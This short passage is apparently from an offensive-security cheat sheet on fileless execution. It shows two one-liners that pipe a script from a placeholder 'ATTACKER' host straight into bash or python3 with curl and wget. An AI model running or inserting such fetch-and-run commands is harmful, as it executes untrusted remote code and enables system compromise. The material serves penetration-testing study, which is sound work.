- Instead of downloading a script to disk, its contents can be piped directly into an interpreter.

---
## curl + bash

```bash
# We download the file and pipe it to bash
curl http://ATTACKER/script.sh | bash
```

## Wget + python

```bash
wget -qO- http://ATTACKER/script.py | python3
```
